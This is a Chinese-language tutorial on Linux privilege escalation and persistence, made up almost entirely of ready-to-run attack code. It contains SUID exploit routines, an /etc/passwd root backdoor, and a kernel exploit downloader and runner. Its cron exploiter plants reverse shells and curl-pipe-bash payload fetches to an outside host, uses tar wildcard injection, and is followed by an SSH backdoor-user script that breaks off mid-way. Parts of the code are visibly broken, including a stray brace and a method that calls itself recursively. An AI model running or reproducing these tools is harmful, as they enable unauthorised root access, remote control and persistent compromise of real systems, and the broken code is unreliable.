# Linux权限提升与持久化

## Linux提权

### SUID提权

#### SUID文件枚举
```bash
#!/bin/bash
# find_suid_files.sh

echo "[*] Searching for SUID files..."

# 查找所有SUID文件
find / -perm -u=s -type f 2>/dev/null | while read file; do
    echo "[+] SUID file found: $file"
    
    # 检查文件权限
    ls -la "$file"
    
    # 检查文件类型
    file "$file"
    
    # 检查是否可写
    if [ -w "$file" ]; then
        echo "[!] WARNING: SUID file is writable: $file"
    fi
done

echo "[*] Searching for SGID files..."
find / -perm -g=s -type f 2>/dev/null | while read file; do
    echo "[+] SGID file found: $file"
done

echo "[*] Checking for interesting SUID binaries..."
# 常见可被利用的SUID二进制文件
interesting_bins=(
    "nmap"
    "vim"
    "nano"
    "less"
    "more"
    "man"
    "awk"
    "nawk"
    "mawk"
    "gawk"
    "grep"
    "find"
    "bash"
    "sh"
    "csh"
    "ksh"
    "zsh"
    "python"
    "python2"
    "python3"
    "perl"
    "ruby"
    "lua"
    "php"
    "ftp"
    "wget"
    "curl"
    "tar"
    "zip"
    "unzip"
    "gzip"
    "gunzip"
    "bzip2"
    "xz"
    "ar"
    "cpio"
    "dd"
    "od"
    "hexdump"
    "xxd"
    "strings"
    "file"
    "strace"
    "ltrace"
    "tcpdump"
    "wireshark"
    "tshark"
    "nc"
    "ncat"
    "telnet"
    "ssh"
    "scp"
    "sftp"
    "rsync"
    "git"
    "svn"
    "cvs"
    "make"
    "gcc"
    "g++"
    "clang"
    "cc"
    "as"
    "ld"
    "gdb"
    "lldb"
    "valgrind"
    "docker"
    "lxc"
    "rkt"
    "systemctl"
    "service"
    "init"
    "systemd"
    "crontab"
    "at"
    "batch"
    "sudo"
    "su"
    "mount"
    "umount"
    "fdisk"
    "gdisk"
    "parted"
    "partprobe"
    "lsblk"
    "blkid"
    "df"
    "du"
    "free"
    "top"
    "htop"
    "iotop"
    "vmstat"
    "iostat"
    "netstat"
    "ss"
    "lsof"
    "fuser"
    "kill"
    "killall"
    "pkill"
    "pgrep"
    "ps"
    "pidof"
    "uptime"
    "w"
    "who"
    "whoami"
    "id"
    "groups"
    "finger"
    "last"
    "lastlog"
    "logname"
    "tty"
    "mesg"
    "wall"
    "write"
    "mail"
    "mailx"
    "mutt"
    "pine"
    "emacs"
    "vi"
    "vim"
    "nano"
    "pico"
    "joe"
    "jed"
    "micro"
    "cat"
    "tac"
    "nl"
    "head"
    "tail"
    "more"
    "less"
    "most"
    "pg"
    "view"
    "tee"
    "sort"
    "uniq"
    "comm"
    "diff"
    "patch"
    "cmp"
    "sdiff"
    "join"
    "cut"
    "paste"
    "tr"
    "expand"
    "unexpand"
    "column"
    "colrm"
    "fold"
    "fmt"
    "pr"
    "printf"
    "echo"
    "read"
    "seq"
    "jot"
    "shuf"
    "factor"
    "primes"
    "bc"
    "dc"
    "calc"
    "expr"
    "test"
    "true"
    "false"
    "yes"
    "no"
    "clear"
    "reset"
    "tput"
    "stty"
    "setterm"
    "dialog"
    "whiptail"
    "zenity"
    "kdialog"
    "gdialog"
    "xmessage"
    "notify-send"
    "wall"
    "write"
    "mesg"
    "talk"
    "ytalk"
    "ntalk"
    "irc"
    "irssi"
    "weechat"
    "bitlbee"
    "finch"
    "mc"
    "vifm"
    "ranger"
    "lf"
    "nnn"
    "fff"
    "xplr"
    "tree"
    "dirdiff"
    "meld"
    "diffuse"
    "xxdiff"
    "kdiff3"
    "tkdiff"
    "vimdiff"
    "emacs"
    "ediff"
    "wdiff"
    "colordiff"
    "grepdiff"
    "patchutils"
    "interdiff"
    "combinediff"
    "flipdiff"
    "lsdiff"
    "filterdiff"
    "fixcvsdiff"
    "undiff"
    "rediff"
    "recountdiff"
    "splitdiff"
    "unwrapdiff"
)

echo "[*] Checking for SUID versions of interesting binaries..."
for bin in "${interesting_bins[@]}"; do
    suid_files=$(find / -name "$bin" -perm -u=s -type f 2>/dev/null)
    if [ ! -z "$suid_files" ]; then
        echo "[!] Found SUID $bin:"
        echo "$suid_files"
    fi
done
```

#### SUID提权利用
```python
# suid_exploitation.py
import os
import subprocess
import tempfile
import shutil
from pathlib import Path

class SUIDExploiter:
    def __init__(self):
        self.suid_binaries = []
        self.exploitation_methods = {
            'find': self.exploit_find,
            'bash': self.exploit_bash,
            'sh': self.exploit_sh,
            'python': self.exploit_python,
            'perl': self.exploit_perl,
            'vim': self.exploit_vim,
            'less': self.exploit_less,
            'more': self.exploit_more,
            'man': self.exploit_man,
            'awk': self.exploit_awk,
            'nmap': self.exploit_nmap,
            'git': self.exploit_git,
            'docker': self.exploit_docker,
            'systemctl': self.exploit_systemctl,
            'mount': self.exploit_mount,
            'umount': self.exploit_umount,
            'cp': self.exploit_cp,
            'mv': self.exploit_mv,
            'tar': self.exploit_tar,
            'zip': self.exploit_zip,
            'unzip': self.exploit_unzip,
            'wget': self.exploit_wget,
            'curl': self.exploit_curl
        }
    
    def find_suid_binaries(self):
        """查找所有SUID二进制文件"""
        try:
            result = subprocess.run(['find', '/', '-perm', '-u=s', '-type', 'f'], 
                                  capture_output=True, text=True, timeout=60)
            if result.returncode == 0:
                self.suid_binaries = result.stdout.strip().split('\n')
                return self.suid_binaries
        except subprocess.TimeoutExpired:
            print("[!] Find command timed out")
        return []
    
    def exploit_find(self, binary_path):
        """利用find命令的-exec参数"""
        print(f"[*] Exploiting SUID find: {binary_path}")
        
        # 方法1: 使用-exec参数
        try:
            result = subprocess.run([binary_path, '.', '-exec', '/bin/sh', '-p', ';'], 
                                  input='', capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                print(f"[+] Got shell via find -exec")
                return True
        except:
            pass
        
        # 方法2: 创建恶意文件并执行
        with tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False) as f:
            f.write('#!/bin/bash\nbash -p\n')
            temp_script = f.name
        
        os.chmod(temp_script, 0o755)
        
        try:
            result = subprocess.run([binary_path, '.', '-exec', temp_script, ';'], 
                                  capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                print(f"[+] Got shell via find with script")
                return True
        except:
            pass
        finally:
            os.unlink(temp_script)
        
        return False
    
    def exploit_bash(self, binary_path):
        """利用SUID bash"""
        print(f"[*] Exploiting SUID bash: {binary_path}")
        
        try:
            # 尝试以-p参数启动bash
            result = subprocess.run([binary_path, '-p'], 
                                  input='', capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                print(f"[+] Got shell via bash -p")
                return True
        except:
            pass
        
        # 尝试设置UID
        try:
            result = subprocess.run([binary_path, '-c', 'bash -p'], 
                                  capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                print(f"[+] Got shell via bash -c")
                return True
        except:
            pass
        
        return False
    
    def exploit_python(self, binary_path):
        """利用SUID python"""
        print(f"[*] Exploiting SUID python: {binary_path}")
        
        python_code = """
import os
import subprocess
os.setuid(0)
os.setgid(0)
os.seteuid(0)
os.setegid(0)
subprocess.call(['/bin/bash', '-p'])
"""
        
        try:
            result = subprocess.run([binary_path, '-c', python_code], 
                                  capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                print(f"[+] Got shell via python")
                return True
        except:
            pass
        
        # 尝试交互式模式
        try:
            result = subprocess.run([binary_path], input=python_code, 
                                  capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                print(f"[+] Got shell via python interactive")
                return True
        except:
            pass
        
        return False
    
    def exploit_vim(self, binary_path):
        """利用SUID vim"""
        print(f"[*] Exploiting SUID vim: {binary_path}")
        
        # 方法1: 使用:!命令
        vim_commands = """
:set shell=/bin/bash
:set shellcmdflag=-p
:!bash
"""
        
        try:
            result = subprocess.run([binary_path], input=vim_commands, 
                                  capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                print(f"[+] Got shell via vim :!")
                return True
        except:
            pass
        
        # 方法2: 写入/etc/passwd
        try:
            # 创建恶意用户条目
            malicious_passwd = "hacker::0:0::/root:/bin/bash\n"
            
            # 使用vim写入文件
            vim_script = f""":w! /tmp/passwd
:q!
"""
            
            # 先创建文件
            with open('/tmp/passwd', 'w') as f:
                f.write(malicious_passwd)
            
            # 使用vim复制到/etc/passwd
            copy_commands = """
:r /tmp/passwd
:w! /etc/passwd
:q!
"""
            
            result = subprocess.run([binary_path, '/etc/passwd'], input=copy_commands, 
                                  capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                print(f"[+] Modified /etc/passwd via vim")
                # 尝试切换到新用户
                try:
                    os.system('su hacker')
                    return True
                except:
                    pass
            }
        except:
            pass
        
        return False
    
    def exploit_nmap(self, binary_path):
        """利用SUID nmap"""
        print(f"[*] Exploiting SUID nmap: {binary_path}")
        
        # 方法1: 使用--interactive模式（旧版本）
        nmap_commands = """
--interactive
!bash -p
"""
        
        try:
            result = subprocess.run([binary_path], input=nmap_commands, 
                                  capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                print(f"[+] Got shell via nmap interactive")
                return True
        except:
            pass
        
        # 方法2: 使用NSE脚本
        nse_script = """
local os = require "os"
os.execute("/bin/bash -p")
"""
        
        # 创建临时NSE脚本
        with tempfile.NamedTemporaryFile(mode='w', suffix='.nse', delete=False) as f:
            f.write(nse_script)
            nse_file = f.name
        
        try:
            result = subprocess.run([binary_path, '--script', nse_file], 
                                  capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                print(f"[+] Got shell via nmap NSE")
                return True
        except:
            pass
        finally:
            os.unlink(nse_file)
        
        return False
    
    def exploit_find(self, binary_path):
        """利用SUID find"""
        return self.exploit_find(binary_path)  # 重用上面的实现
    
    def exploit_systemctl(self, binary_path):
        """利用SUID systemctl"""
        print(f"[*] Exploiting SUID systemctl: {binary_path}")
        
        # 创建恶意的systemd单元文件
        unit_content = """
[Unit]
Description=Red Team Service
After=network.target

[Service]
Type=oneshot
ExecStart=/bin/bash -p
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
"""
        
        # 创建临时单元文件
        with tempfile.NamedTemporaryFile(mode='w', suffix='.service', delete=False) as f:
            f.write(unit_content)
            service_file = f.name
        
        try:
            # 启用并启动服务
            result = subprocess.run([binary_path, 'enable', service_file], 
                                  capture_output=True, text=True, timeout=10)
            
            result = subprocess.run([binary_path, 'start', 'redteam'], 
                                  capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                print(f"[+] Got shell via systemctl")
                return True
        except:
            pass
        finally:
            os.unlink(service_file)
        
        return False
    
    def exploit_docker(self, binary_path):
        """利用SUID docker"""
        print(f"[*] Exploiting SUID docker: {binary_path}")
        
        try:
            # 使用docker运行特权容器
            result = subprocess.run([binary_path, 'run', '-v', '/:/host', 'alpine', 'chroot', '/host', '/bin/bash'], 
                                  capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                print(f"[+] Got shell via docker")
                return True
        except:
            pass
        
        # 尝试其他方法
        try:
            result = subprocess.run([binary_path, 'run', '--rm', '-v', '/:/mnt', 'alpine', '/bin/sh', '-c', 'cp /bin/bash /mnt/tmp/rootbash && chmod +s /mnt/tmp/rootbash'], 
                                  capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                # 执行创建的SUID bash
                result = subprocess.run(['/tmp/rootbash', '-p'], 
                                      capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    print(f"[+] Got shell via docker SUID bash")
                    return True
        except:
            pass
        
        return False
    
    def auto_exploit(self):
        """自动检测和利用SUID提权"""
        print("[*] Starting SUID exploitation...")
        
        suid_files = self.find_suid_binaries()
        if not suid_files:
            print("[!] No SUID files found")
            return False
        
        print(f"[+] Found {len(suid_files)} SUID files")
        
        exploited = False
        for suid_file in suid_files:
            if not suid_file:
                continue
            
            # 获取二进制文件名
            binary_name = os.path.basename(suid_file)
            
            # 检查是否有对应的利用方法
            if binary_name in self.exploitation_methods:
                print(f"[*] Found exploitable SUID: {suid_file}")
                
                # 尝试利用
                if self.exploitation_methods[binary_name](suid_file):
                    print(f"[+] Successfully exploited {suid_file}")
                    exploited = True
                    break
                else:
                    print(f"[!] Failed to exploit {suid_file}")
            
            # 特殊处理find命令
            if binary_name == 'find':
                if self.exploit_find(suid_file):
                    print(f"[+] Successfully exploited find at {suid_file}")
                    exploited = True
                    break
        
        return exploited

# 使用示例
exploiter = SUIDExploiter()
exploiter.auto_exploit()
```

### 内核漏洞利用

#### 内核版本检测
```python
# kernel_exploit_detection.py
import platform
import subprocess
import re
from datetime import datetime

class KernelExploitDetector:
    def __init__(self):
        self.kernel_version = platform.release()
        self.distribution = platform.dist()
        self.architecture = platform.machine()
        
        # 常见内核漏洞数据库
        self.kernel_vulnerabilities = {
            'CVE-2016-5195': {
                'name': 'DirtyCow',
                'affected_versions': ['2.6.22', '4.8.3'],
                'description': 'Privilege escalation via race condition in copy-on-write',
                'exploit_available': True
            },
            'CVE-2019-13272': {
                'name': 'PTRACE_TRACEME',
                'affected_versions': ['4.10', '5.1.17'],
                'description': 'Local privilege escalation via PTRACE_TRACEME',
                'exploit_available': True
            },
            'CVE-2021-3156': {
                'name': 'Baron Samedit',
                'affected_versions': ['1.8.2', '1.9.5p1'],
                'description': 'Heap-based buffer overflow in sudo',
                'exploit_available': True
            },
            'CVE-2021-4034': {
                'name': 'PwnKit',
                'affected_versions': ['0.0.0', '1.0.0'],
                'description': 'Local privilege escalation in pkexec',
                'exploit_available': True
            },
            'CVE-2022-0847': {
                'name': 'DirtyPipe',
                'affected_versions': ['5.8', '5.16.10'],
                'description': 'Privilege escalation via pipe buffer manipulation',
                'exploit_available': True
            }
        }
    
    def get_kernel_info(self):
        """获取详细的内核信息"""
        try:
            # 获取uname信息
            uname_result = subprocess.run(['uname', '-a'], capture_output=True, text=True, timeout=5)
            
            # 获取内核版本详细信息
            version_result = subprocess.run(['cat', '/proc/version'], capture_output=True, text=True, timeout=5)
            
            # 获取发行版信息
            if os.path.exists('/etc/os-release'):
                os_release_result = subprocess.run(['cat', '/etc/os-release'], capture_output=True, text=True, timeout=5)
            else:
                os_release_result = None
            
            return {
                'uname': uname_result.stdout.strip() if uname_result.returncode == 0 else None,
                'version': version_result.stdout.strip() if version_result.returncode == 0 else None,
                'os_release': os_release_result.stdout.strip() if os_release_result and os_release_result.returncode == 0 else None,
                'kernel_version': self.kernel_version,
                'distribution': self.distribution,
                'architecture': self.architecture
            }
        except subprocess.TimeoutExpired:
            print("[!] Command timeout")
            return None
    
    def parse_kernel_version(self, version_string):
        """解析内核版本号"""
        # 提取版本号
        version_pattern = r'(\d+\.\d+\.\d+)'
        match = re.search(version_pattern, version_string)
        if match:
            return match.group(1)
        return None
    
    def compare_versions(self, version1, version2):
        """比较两个版本号"""
        v1_parts = [int(x) for x in version1.split('.')]
        v2_parts = [int(x) for x in version2.split('.')]
        
        # 补齐版本号位数
        max_len = max(len(v1_parts), len(v2_parts))
        v1_parts.extend([0] * (max_len - len(v1_parts)))
        v2_parts.extend([0] * (max_len - len(v2_parts)))
        
        for i in range(max_len):
            if v1_parts[i] < v2_parts[i]:
                return -1
            elif v1_parts[i] > v2_parts[i]:
                return 1
        
        return 0
    
    def is_version_in_range(self, current_version, min_version, max_version):
        """检查当前版本是否在漏洞影响范围内"""
        current = self.compare_versions(current_version, min_version)
        max_check = self.compare_versions(current_version, max_version)
        
        return current >= 0 and max_check <= 0
    
    def check_vulnerabilities(self):
        """检查已知内核漏洞"""
        print("[*] Checking for known kernel vulnerabilities...")
        
        kernel_info = self.get_kernel_info()
        if not kernel_info:
            print("[!] Failed to get kernel information")
            return []
        
        print(f"[*] Kernel version: {kernel_info['kernel_version']}")
        print(f"[*] Architecture: {kernel_info['architecture']}")
        
        if kernel_info['version']:
            print(f"[*] Version info: {kernel_info['version']}")
        
        vulnerable_cves = []
        
        for cve, vuln_info in self.kernel_vulnerabilities.items():
            min_version = vuln_info['affected_versions'][0]
            max_version = vuln_info['affected_versions'][1]
            
            if self.is_version_in_range(kernel_info['kernel_version'], min_version, max_version):
                print(f"[!] System may be vulnerable to {cve}: {vuln_info['name']}")
                print(f"    Description: {vuln_info['description']}")
                print(f"    Affected versions: {min_version} - {max_version}")
                
                if vuln_info['exploit_available']:
                    print(f"    [+] Exploit available")
                    vulnerable_cves.append(cve)
        
        return vulnerable_cves
    
    def download_exploit(self, cve):
        """下载漏洞利用代码"""
        exploit_urls = {
            'CVE-2016-5195': 'https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c',
            'CVE-2021-4034': 'https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.c',
            'CVE-2022-0847': 'https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c'
        }
        
        if cve not in exploit_urls:
            print(f"[!] No known exploit URL for {cve}")
            return False
        
        print(f"[*] Downloading exploit for {cve}...")
        
        try:
            import urllib.request
            
            url = exploit_urls[cve]
            filename = f"{cve.lower().replace('-', '_')}_exploit.c"
            
            urllib.request.urlretrieve(url, filename)
            print(f"[+] Exploit downloaded to {filename}")
            return True
            
        except Exception as e:
            print(f"[!] Failed to download exploit: {e}")
            return False
    
    def compile_exploit(self, source_file):
        """编译漏洞利用代码"""
        print(f"[*] Compiling {source_file}...")
        
        output_file = source_file.replace('.c', '')
        
        try:
            result = subprocess.run(['gcc', '-o', output_file, source_file], 
                                  capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                print(f"[+] Exploit compiled successfully: {output_file}")
                
                # 设置SUID位
                os.chmod(output_file, 0o4755)
                print(f"[+] Set SUID bit on {output_file}")
                
                return output_file
            else:
                print(f"[!] Compilation failed: {result.stderr}")
                return None
                
        except subprocess.TimeoutExpired:
            print("[!] Compilation timed out")
            return None
        except FileNotFoundError:
            print("[!] GCC not found")
            return None
    
    def run_exploit(self, exploit_binary):
        """运行漏洞利用程序"""
        print(f"[*] Running exploit: {exploit_binary}")
        
        try:
            result = subprocess.run([f'./{exploit_binary}'], 
                                  capture_output=True, text=True, timeout=30)
            
            print(f"[*] Exploit output:")
            print(result.stdout)
            
            if result.stderr:
                print(f"[*] Exploit errors:")
                print(result.stderr)
            
            if result.returncode == 0:
                print(f"[+] Exploit completed successfully")
                
                # 检查是否获得root权限
                if os.geteuid() == 0:
                    print(f"[+] Got root privileges!")
                    return True
                else:
                    print(f"[!] Exploit completed but no root privileges gained")
                    return False
            else:
                print(f"[!] Exploit failed with return code: {result.returncode}")
                return False
                
        except subprocess.TimeoutExpired:
            print("[!] Exploit timed out")
            return False
        except PermissionError:
            print("[!] Permission denied running exploit")
            return False
    
    def auto_exploit(self):
        """自动检测和利用内核漏洞"""
        print("[*] Starting automatic kernel exploitation...")
        
        vulnerable_cves = self.check_vulnerabilities()
        
        if not vulnerable_cves:
            print("[!] No known vulnerabilities found")
            return False
        
        for cve in vulnerable_cves:
            print(f"\n[*] Attempting to exploit {cve}...")
            
            # 下载漏洞利用
            if self.download_exploit(cve):
                source_file = f"{cve.lower().replace('-', '_')}_exploit.c"
                
                # 编译漏洞利用
                exploit_binary = self.compile_exploit(source_file)
                if exploit_binary:
                    # 运行漏洞利用
                    if self.run_exploit(exploit_binary):
                        print(f"[+] Successfully exploited {cve}")
                        return True
                    else:
                        print(f"[!] Failed to exploit {cve}")
                else:
                    print(f"[!] Failed to compile exploit for {cve}")
            else:
                print(f"[!] Failed to download exploit for {cve}")
        
        return False

# 使用示例
detector = KernelExploitDetector()
detector.auto_exploit()
```

### Cron Jobs提权

#### Cron任务枚举
```bash
#!/bin/bash
# cron_enumeration.sh

echo "[*] Enumerating cron jobs..."

# 检查系统cron任务
echo "[*] System cron jobs:"
if [ -f /etc/crontab ]; then
    echo "[+] /etc/crontab:"
    cat /etc/crontab
fi

# 检查cron.d目录
echo "[*] Cron.d jobs:"
if [ -d /etc/cron.d ]; then
    for cron_file in /etc/cron.d/*; do
        if [ -f "$cron_file" ]; then
            echo "[+] $cron_file:"
            cat "$cron_file"
        fi
    done
fi

# 检查cron.daily, cron.hourly, cron.weekly, cron.monthly
echo "[*] Periodic cron jobs:"
for period in daily hourly weekly monthly; do
    cron_dir="/etc/cron.$period"
    if [ -d "$cron_dir" ]; then
        echo "[+] $cron_dir:"
        for script in "$cron_dir"/*; do
            if [ -f "$script" ]; then
                echo "    $script"
                ls -la "$script"
            fi
        done
    fi
done

# 检查用户cron任务
echo "[*] User cron jobs:"
for user in $(cut -f1 -d: /etc/passwd); do
    crontab_file="/var/spool/cron/crontabs/$user"
    if [ -f "$crontab_file" ]; then
        echo "[+] $user crontab:"
        cat "$crontab_file" 2>/dev/null
    fi
done

# 检查at任务
echo "[*] AT jobs:"
if [ -d /var/spool/cron/atjobs ]; then
    for at_job in /var/spool/cron/atjobs/*; do
        if [ -f "$at_job" ]; then
            echo "[+] AT job: $at_job"
            at -c "$(basename "$at_job")" 2>/dev/null
        fi
    done
fi

# 检查可写的cron相关文件
echo "[*] Checking for writable cron files..."
find /etc/cron* /var/spool/cron* -type f -writable 2>/dev/null | while read file; do
    echo "[!] Writable cron file: $file"
done

# 检查cron允许/拒绝文件
echo "[*] Cron allow/deny files:"
for file in /etc/cron.allow /etc/cron.deny /etc/at.allow /etc/at.deny; do
    if [ -f "$file" ]; then
        echo "[+] $file:"
        cat "$file"
    fi
done
```

#### Cron提权利用
```python
# cron_exploitation.py
import os
import subprocess
import tempfile
import shutil
from pathlib import Path
import stat

class CronExploiter:
    def __init__(self):
        self.writable_cron_files = []
        self.vulnerable_cron_jobs = []
    
    def find_writable_cron_files(self):
        """查找可写的cron相关文件"""
        cron_locations = [
            '/etc/crontab',
            '/etc/cron.d',
            '/etc/cron.daily',
            '/etc/cron.hourly',
            '/etc/cron.weekly',
            '/etc/cron.monthly',
            '/var/spool/cron',
            '/var/spool/cron/crontabs'
        ]
        
        for location in cron_locations:
            if os.path.exists(location):
                if os.path.isfile(location):
                    # 检查文件是否可写
                    if os.access(location, os.W_OK):
                        self.writable_cron_files.append(location)
                        print(f"[!] Writable cron file: {location}")
                elif os.path.isdir(location):
                    # 检查目录中的文件
                    for root, dirs, files in os.walk(location):
                        for file in files:
                            file_path = os.path.join(root, file)
                            if os.access(file_path, os.W_OK):
                                self.writable_cron_files.append(file_path)
                                print(f"[!] Writable cron file: {file_path}")
        
        return self.writable_cron_files
    
    def analyze_cron_job(self, cron_file):
        """分析cron任务的安全性"""
        vulnerable_jobs = []
        
        try:
            with open(cron_file, 'r') as f:
                content = f.read()
            
            lines = content.split('\n')
            for line_num, line in enumerate(lines, 1):
                line = line.strip()
                
                # 跳过注释和空行
                if not line or line.startswith('#'):
                    continue
                
                # 检查是否包含可写的脚本路径
                if 'sh ' in line or 'bash ' in line or 'python ' in line:
                    # 提取脚本路径
                    parts = line.split()
                    for part in parts:
                        if part.startswith('/') and (part.endswith('.sh') or part.endswith('.py') or 'script' in part):
                            if os.path.exists(part) and os.access(part, os.W_OK):
                                vulnerable_jobs.append({
                                    'file': cron_file,
                                    'line': line_num,
                                    'command': line,
                                    'vulnerable_script': part
                                })
                                print(f"[!] Vulnerable cron job in {cron_file}:{line_num}")
                                print(f"    Command: {line}")
                                print(f"    Writable script: {part}")
                
                # 检查是否包含通配符
                if '*' in line and 'tar' in line:
                    # 可能存在通配符注入
                    vulnerable_jobs.append({
                        'file': cron_file,
                        'line': line_num,
                        'command': line,
                        'type': 'wildcard_injection'
                    })
                    print(f"[!] Potential wildcard injection in {cron_file}:{line_num}")
                    print(f"    Command: {line}")
            
        except PermissionError:
            print(f"[!] Permission denied reading {cron_file}")
        except Exception as e:
            print(f"[!] Error analyzing {cron_file}: {e}")
        
        return vulnerable_jobs
    
    def exploit_writable_cron_file(self, cron_file):
        """利用可写的cron文件"""
        print(f"[*] Exploiting writable cron file: {cron_file}")
        
        # 创建恶意的cron任务
        malicious_cron = f"""
# Malicious cron job
* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'
@reboot root /bin/bash -c 'curl http://192.168.1.100:8080/payload.sh | bash'
"""
        
        try:
            # 备份原始文件
            backup_file = f"{cron_file}.bak"
            shutil.copy2(cron_file, backup_file)
            print(f"[+] Backed up {cron_file} to {backup_file}")
            
            # 添加恶意内容
            with open(cron_file, 'a') as f:
                f.write(malicious_cron)
            
            print(f"[+] Added malicious cron job to {cron_file}")
            return True
            
        except Exception as e:
            print(f"[!] Failed to exploit {cron_file}: {e}")
            return False
    
    def exploit_writable_script(self, script_path):
        """利用可写的cron脚本"""
        print(f"[*] Exploiting writable cron script: {script_path}")
        
        try:
            # 备份原始脚本
            backup_file = f"{script_path}.bak"
            shutil.copy2(script_path, backup_file)
            print(f"[+] Backed up {script_path} to {backup_file}")
            
            # 在脚本开头添加恶意代码
            with open(script_path, 'r') as f:
                original_content = f.read()
            
            malicious_code = """#!/bin/bash
# Malicious code added by RedTeam
curl http://192.168.1.100:8080/payload.sh | bash
/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1' &
"""
            
            # 写入新的脚本内容
            with open(script_path, 'w') as f:
                f.write(malicious_code)
                f.write(original_content)
            
            # 确保脚本有执行权限
            os.chmod(script_path, os.stat(script_path).st_mode | stat.S_IEXEC)
            
            print(f"[+] Injected malicious code into {script_path}")
            return True
            
        except Exception as e:
            print(f"[!] Failed to exploit {script_path}: {e}")
            return False
    
    def exploit_wildcard_injection(self, cron_command):
        """利用通配符注入"""
        print(f"[*] Exploiting wildcard injection in: {cron_command}")
        
        # 假设cron命令类似: tar -czf backup.tar.gz /home/user/*
        # 我们可以创建恶意文件来利用通配符
        
        # 提取目标目录
        import re
        match = re.search(r'(\S+/)\*', cron_command)
        if not match:
            print(f"[!] Could not find wildcard target directory")
            return False
        
        target_dir = match.group(1)
        print(f"[*] Target directory: {target_dir}")
        
        # 创建恶意文件
        try:
            # 创建各种可能被执行的文件
            malicious_files = [
                '--checkpoint=1',
                '--checkpoint-action=exec=/bin/bash -c "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"'
            ]
            
            for filename in malicious_files:
                filepath = os.path.join(target_dir, filename)
                with open(filepath, 'w') as f:
                    f.write('')
                print(f"[+] Created malicious file: {filepath}")
            
            return True
            
        except Exception as e:
            print(f"[!] Failed to create malicious files: {e}")
            return False
    
    def create_malicious_cron_job(self):
        """创建新的恶意cron任务"""
        print("[*] Creating malicious cron job...")
        
        # 创建恶意的cron任务
        malicious_cron = """# RedTeam malicious cron job
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin

# 每分钟执行
* * * * * root /bin/bash -c 'curl http://192.168.1.100:8080/payload.sh | bash'

# 系统启动时执行
@reboot root /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'

# 每小时执行
0 * * * * root /bin/bash -c 'wget -q -O- http://192.168.1.100:8080/payload.sh | bash'
"""
        
        # 尝试写入不同的cron位置
        cron_locations = [
            '/etc/cron.d/redteam',
            '/etc/crontab',
            '/var/spool/cron/crontabs/root'
        ]
        
        for location in cron_locations:
            try:
                if os.path.exists(location) and os.access(location, os.W_OK):
                    with open(location, 'a') as f:
                        f.write(malicious_cron)
                    print(f"[+] Added malicious cron job to {location}")
                    return location
                elif not os.path.exists(location):
                    # 尝试创建文件
                    with open(location, 'w') as f:
                        f.write(malicious_cron)
                    print(f"[+] Created malicious cron job at {location}")
                    return location
                    
            except PermissionError:
                continue
            except Exception as e:
                print(f"[!] Failed to write to {location}: {e}")
                continue
        
        print("[!] Could not create malicious cron job")
        return None
    
    def auto_exploit(self):
        """自动检测和利用cron提权"""
        print("[*] Starting automatic cron exploitation...")
        
        # 查找可写的cron文件
        writable_files = self.find_writable_cron_files()
        if writable_files:
            print(f"[+] Found {len(writable_files)} writable cron files")
            
            # 直接利用可写的cron文件
            for file in writable_files:
                if self.exploit_writable_cron_file(file):
                    print(f"[+] Successfully exploited {file}")
                    return True
        
        # 分析现有的cron任务
        print("[*] Analyzing existing cron jobs...")
        vulnerable_jobs = []
        
        for cron_file in ['/etc/crontab', '/etc/cron.d']:
            if os.path.exists(cron_file):
                jobs = self.analyze_cron_job(cron_file)
                vulnerable_jobs.extend(jobs)
        
        # 利用脆弱的cron任务
        for job in vulnerable_jobs:
            if 'vulnerable_script' in job:
                if self.exploit_writable_script(job['vulnerable_script']):
                    print(f"[+] Successfully exploited script {job['vulnerable_script']}")
                    return True
            elif job.get('type') == 'wildcard_injection':
                if self.exploit_wildcard_injection(job['command']):
                    print(f"[+] Successfully exploited wildcard injection")
                    return True
        
        # 如果以上方法都失败，创建新的cron任务
        print("[*] Creating new malicious cron job...")
        if self.create_malicious_cron_job():
            print("[+] Created malicious cron job")
            return True
        
        print("[!] All exploitation methods failed")
        return False

# 使用示例
exploiter = CronExploiter()
exploiter.auto_exploit()
```

---

## Linux持久化

### SSH密钥持久化

#### SSH密钥后门
```bash
#!/bin/bash
# ssh_backdoor.sh

echo "[*] Setting up SSH key backdoor..."

# 创建后门用户
BACKDOOR_USER="sysadmin"
BACKDOOR_HOME="/home/$BACKDOOR_USER"

# 检查用户是否已存在
if id "$BACKDOOR_USER" &>/dev/null; then
    echo "[+] Backdoor user already exists"
else
    # 创建用户
    useradd -m -s /bin/bash "$BACKDOOR_USER"
    echo "$BACKDOOR_USER:BackDoor123!" | chpasswd
    echo "[+] Created backdoor user: $BACKDOOR_USER"
fi

# 创建SSH密钥
SSH_DIR="$BACKDOOR_HOME/.ssh"
mkdir -p "$SSH_DIR"

# 生成RSA密钥对
if [ ! -f "$SSH_DIR/id_rsa" ]; then
    ssh-keygen -t rsa -b 4096 -f "$SSH_DIR/id_rsa" -N "" -C "sysadmin@$(hostname)"
    echo "[+] Generated SSH key pair"
fi

# 设置authorized_keys
cat > "$SSH_DIR/authorized_keys" << 'EOF'
ssh-rsa AAAAB3NzaC1yc2EA... redteam@target
EOF

# 设置正确的权限
chmod 700 "$SSH_DIR"
